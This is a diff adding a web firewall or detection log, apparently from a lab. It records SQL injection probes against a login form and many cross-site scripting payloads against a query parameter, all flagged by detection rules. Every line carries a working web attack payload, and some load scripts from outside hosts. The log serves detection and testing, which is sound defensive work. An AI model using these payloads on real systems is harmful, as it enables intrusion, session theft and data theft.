@@ -1,0 +1,101 @@
+Thu Jun 20 00:00:14 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd AND 5954=2507-- nLPm&password=asd
+Thu Jun 20 00:00:14 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd AND 6860=6860-- PnbC&password=asd
+Thu Jun 20 00:00:20 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(72)||CHR(79)||CHR(84),5) FROM DUAL--&password=asd
+Thu Jun 20 00:00:20 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(72)||CHR(79)||CHR(84),5) FROM DUAL--&password=asd
+Thu Jun 20 00:00:32 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' ORDER BY 1-- -&password=asd
+Thu Jun 20 00:00:32 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' ORDER BY 2376-- -&password=asd
+Thu Jun 20 00:00:32 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' ORDER BY 10-- -&password=asd
+Thu Jun 20 00:00:32 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' ORDER BY 6-- -&password=asd
+Thu Jun 20 00:00:32 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' ORDER BY 4-- -&password=asd
+Thu Jun 20 00:00:32 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' ORDER BY 3-- -&password=asd
+Thu Jun 20 00:00:32 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT NULL,NULL,CONCAT(0x7176717671,0x43546b6b4358746e726b4e456b67667a417758757a536944486c5359474a4b4a7366584649494643,0x71767a7071)-- -&password=asd
+Thu Jun 20 00:00:32 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT CONCAT(0x7176717671,0x437a67797148724c454a644d57776b44434a65594f576d6f59445763774279516b76585052476576,0x71767a7071),NULL,NULL-- -&password=asd
+Thu Jun 20 00:00:32 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT NULL,CONCAT(0x7176717671,0x714d4f4a44455a5a41444f4c7a70565462566a786c634d454a6a4a6464424d72484267594151536f,0x71767a7071),NULL-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT CONCAT(0x7176717671,0x71775a794c68627468614176544c6b6457686d4e6472456e67784d755358456f6b6641495a754b63,0x71767a7071),70,70-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT 70,70,CONCAT(0x7176717671,0x675953524a45614244556f6b48634e4543694674775543556346626a66514c4945714a724b6d5767,0x71767a7071)-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT 70,CONCAT(0x7176717671,0x507a65656f6b585777476d4764576d656d4a4f54787675447047726877644f744641745763494d65,0x71767a7071),70-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT CONCAT(0x7176717671,0x4e7473666c685248484c,0x71767a7071),70,70-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT 70,70,CONCAT(0x7176717671,0x4d5163777553767a4e44,0x71767a7071)-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT 70,CONCAT(0x7176717671,0x52634e77526c6c6a6765,0x71767a7071),70-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-3995' UNION ALL SELECT CONCAT(0x7176717671,0x674d696f6875745051596f6d7350436f44586c4b4c57455a4a51485473445777537051704d74744d,0x71767a7071),70,70-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-8299' UNION ALL SELECT 70,CONCAT(0x7176717671,0x797a51676a70554e516d6c686d75684a4f7663454458426e57426d6f4d72554e5361626675725972,0x71767a7071),70-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-9832' UNION ALL SELECT 70,70,CONCAT(0x7176717671,0x6d5657766d53486946614c7164486e744a797657444673424d596a476a616f6c526258637542586b,0x71767a7071)-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-9082' UNION ALL SELECT CONCAT(0x7176717671,0x4b654264664157635253,0x71767a7071),70,70-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-6137' UNION ALL SELECT 70,CONCAT(0x7176717671,0x464c467456466678714f,0x71767a7071),70-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-5343' UNION ALL SELECT 70,70,CONCAT(0x7176717671,0x73744b4b766e526b4678,0x71767a7071)-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT NULL-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT NULL,NULL-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT NULL,NULL,NULL-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT NULL,NULL,NULL,NULL-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&password=asd
+Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&password=asd
+Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT CONCAT(0x7176717671,0x6f4e56756e436455657455634851715746536c4171636d4964494c4c435168694e4e776345424443,0x71767a7071),57,57-- -&password=asd
+Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT 57,CONCAT(0x7176717671,0x446c4d6a646149526a63597251566a5962506b5a5057747846556c41654c616b4a6c665948765143,0x71767a7071),57-- -&password=asd
+Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT 57,57,CONCAT(0x7176717671,0x63674f6945477864506a,0x71767a7071)-- -&password=asd
+Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT CONCAT(0x7176717671,0x5866557645554d695273,0x71767a7071),57,57-- -&password=asd
+Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT 57,CONCAT(0x7176717671,0x42787a7a4d484763676e,0x71767a7071),57-- -&password=asd
+Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-8002' UNION ALL SELECT 57,CONCAT(0x7176717671,0x4b717968514e4264744a516b6a786a74574b68496c644c6d6242736b4767557a736f71634e414162,0x71767a7071),57-- -&password=asd
+Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-7243' UNION ALL SELECT 57,57,CONCAT(0x7176717671,0x6478756c6849696e6241485063496653726c4b4d555a63514c4b774c6371587079634a4e636a626f,0x71767a7071)-- -&password=asd
+Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-5578' UNION ALL SELECT CONCAT(0x7176717671,0x6a4a5159636e544e6774574c53705764616e4768774d774f63536170414547497058474142796c66,0x71767a7071),57,57-- -&password=asd
+Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-8405' UNION ALL SELECT 57,CONCAT(0x7176717671,0x4a6a416e78435a6b455a,0x71767a7071),57-- -&password=asd
+Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-2550' UNION ALL SELECT 57,57,CONCAT(0x7176717671,0x5553716651526d6c4a75,0x71767a7071)-- -&password=asd
+Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-7585' UNION ALL SELECT CONCAT(0x7176717671,0x646f6a4f526d4a58564b,0x71767a7071),57,57-- -&password=asd
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<;SCRIPT>;a=/XSS/
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [SQLi, xss_multiple_payload_detection] | request: query=&lt;&#34;&#39;;alert(String.fromCharCode(88,83,83))//\&#39;;alert(String.fromCharCode(88,83,83))//&#34;;alert(String.fromCharCode(88,83,83))//\&#34;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&#34;&gt;&#39;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;iFrAme/src=jaVascRipt:alert.bind()(1)+class=dalfox&gt;&lt;/iFramE&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<SCRIPT+onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<frameset+onScroll+frameset+onScroll="javascript:javascript:alert(1)"></frameset+onScroll>
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;HEAD&gt;&lt;META+HTTP-EQUIV=\"CONTENT-TYPE\"+CONTENT=\"text/html;+charset=UTF-7\"&gt;+&lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<SCRIPT+SRC="%(jpg)s"></SCRIPT>
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<meta+charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&amp;lt;LINK+REL=\&#34;stylesheet\&#34;+HREF=\&#34;javascript&amp;#058;alert(&#39;XSS&#39;);\&#34;&amp;gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, XSS_Payload_8] | request: query=<img+src\x13=x+onerror="javascript:alert(1)">
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;;STYLE+TYPE=&#34;;text/javascript&#34;;&gt;;alert(&#39;;XSS&#39;;);&lt;;/STYLE&gt;;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;iframe+src=&#34;vbscript:document.vulnerable=true;&#34;&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;a+href=&#34;javas\x0Bcript:javascript:alert(1)&#34;+id=&#34;fuzzelement1&#34;&gt;test&lt;/a&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, XSS_Payload_1] | request: query=--><!--+--\x3E>+<img+src=xxx:x+onerror=javascript:alert(1)>+-->
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=ABC<div+style="x:\x0Aexpression(javascript:alert(1)">DEF
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<xml+id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A+CLASS=XSS></A>
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;;FRAMESET&gt;;&lt;;FRAME+SRC=&#34;;javascript:alert(&#39;;XSS&#39;;);&#34;;&gt;;&lt;;/FRAMESET&gt;;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<BGSOUND+SRC="javascript:alert('XSS');">
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<a+href="\x11javascript:javascript:alert(1)"+id="fuzzelement1">test</a>
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<img+src\x47=x+onerror="javascript:alert(1)">
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<<script>document.vulnerable=true;</script>
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<script+src=%(jscript)s></script>
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: query=&lt;IMG+SRC=x+onplaying=&#34;alert(String.fromCharCode(88,83,83))&#34;&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;STYLE&gt;.XSS{background-image:url(&#34;javascript:javascript:alert(1)&#34;);}&lt;/STYLE&gt;&lt;A+CLASS=XSS&gt;&lt;/A&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=ABC<div+style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query='"`><script>/*+*\x2Fjavascript:alert(1)//+*/</script>
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: query=&lt;IMG+SRC=x+ondragend=&#34;alert(String.fromCharCode(88,83,83))&#34;&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;IMG+SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=</script><script>alert('XSS');</script>
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;script&gt;({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval&lt;/script&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;embed+code=&#34;http://businessinfo.co.uk/labs/xss/xss.swf&#34;+allowscriptaccess=always&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [SQLi, xss_multiple_payload_detection] | request: query=&lt;!--#exec+cmd=&#34;/bin/echo+&#39;&lt;SCR&#39;&#34;--&gt;&lt;!--#exec+cmd=&#34;/bin/echo+&#39;IPT+SRC=http://www.securitycompass.com/xss.js&gt;&lt;/SCRIPT&gt;&#39;&#34;--&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<IMG+SRC=”javascript:alert(‘XSS’)”
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;sVg&gt;&lt;scRipt+&gt;alert&amp;lpar;1&amp;rpar;+{Opera}
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<script>Object.__noSuchMethod__+=+Function,[{}][0].constructor._('javascript:alert(1)')()</script>
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;a+href=&#34;javas\x0Bcript:javascript:alert(1)&#34;+id=&#34;fuzzelement1&#34;&gt;test&lt;/a&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<meta+http-equiv="refresh"+content="0;url=javascript:confirm(1)">
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<iframe+src=http://xss.rocks/scriptlet.html+<
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;video&gt;&lt;source+onerror=&#34;javascript:javascript:alert(1)&#34;&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=ABC<div+style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;TABLE&gt;&lt;TD+BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<LAYER+SRC="%(scriptlet)s"></LAYER>
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<P+STYLE="behavior:url('#default#time2')"+end="0"+onEnd="javascript:alert(1)">
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;;IMG+SRC=&#39;;vbscript:msgbox(&#34;;XSS&#34;;)&#39;;&gt;;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;form+id=&#34;test&#34;+/&gt;&lt;button+form=&#34;test&#34;+formaction=&#34;javascript:javascript:alert(1)&#34;&gt;X
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<embed+src="javascript:alert(1)">
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<a+href="\xE2\x80\x87javascript:javascript:alert(1)"+id="fuzzelement1">test</a>
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;OBJECT+TYPE=&#34;text/x-scriptlet&#34;+DATA=&#34;http://www.securitycompass.com/scriptlet.html&#34;&gt;&lt;/object&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: query=&lt;IMG+SRC=x+onhashchange=&#34;alert(String.fromCharCode(88,83,83))&#34;&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;SCRIPT&gt;a=/XSS/
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;a+href=&#34;\xE2\x80\x85javascript:javascript:alert(1)&#34;+id=&#34;fuzzelement1&#34;&gt;test&lt;/a&gt;
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<html+onMouseMove+html+onMouseMove="javascript:javascript:alert(1)"></html+onMouseMove>
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;HEAD&gt;&lt;META+HTTP-EQUIV=&quot;CONTENT-TYPE&quot;+CONTENT=&quot;text/html;+charset=UTF-7&quot;&gt;+&lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<img+src="javascript:alert(1)">
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=</svg>''<svg><script+'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29;+{Opera}
+Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<a+href="\x1Ajavascript:javascript:alert(1)"+id="fuzzelement1">test</a>
